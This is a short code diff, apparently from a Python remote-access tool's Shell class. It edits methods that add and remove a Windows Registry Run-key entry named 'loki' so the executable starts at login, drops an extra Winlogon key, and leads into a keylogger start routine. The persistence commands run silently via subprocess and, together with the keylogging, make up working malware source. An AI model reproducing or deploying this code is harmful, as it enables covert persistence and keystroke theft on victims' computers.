@@ -158,17 +158,13 @@ class Shell(object):
     def create_persist(self, args):
         if hasattr(sys, 'frozen'):
             _path = sys.executable
-            _cmd = r'reg add HKCU\Software\Microsoft\Windows\Winlogon /v loki /f /d "\"{}\""'.format(_path)
             cmd = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v loki /f /d "\"{}\""'.format(_path)
             subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            subprocess.Popen(_cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def remove_persist(self, args):
         if hasattr(sys, 'frozen'):
-            _cmd = r'reg delete HKCU\Software\Microsoft\Windows\Winlogon /v loki /f'
             cmd = r'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v loki /f'
             subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            subprocess.Popen(_cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     def logger_start(self, args):
         if not self.keylogger:
